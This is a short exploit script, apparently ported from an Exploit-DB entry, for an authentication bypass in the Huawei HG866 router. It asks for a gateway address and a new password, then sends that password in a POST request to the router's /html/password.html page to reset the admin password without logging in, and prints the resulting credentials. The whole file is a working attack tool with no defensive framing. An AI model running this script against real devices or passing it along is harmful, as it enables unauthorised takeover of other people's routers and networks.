/**
* Title: Huawei HG866 Authentication Bypass
* Discovered by: hkm
* Exploit from https://www.exploit-db.com/exploits/19185/
*/

load "http/curl"

print "Huawei HG866 Authentication Bypass\n"
print "IP Gateway: "
input.start()
    @gateway = input.value
    @exploit = "/html/password.html"
input.close()

print "Set password admin: "
input.start()
    @password = input.value
    curl.post(@gateway.@exploit,array("psw"=> @password))
    
    print "\nGateway: ".@gateway."\n"
    print "Username: admin\n"
    print "Password: ".@password."\n"
input.close()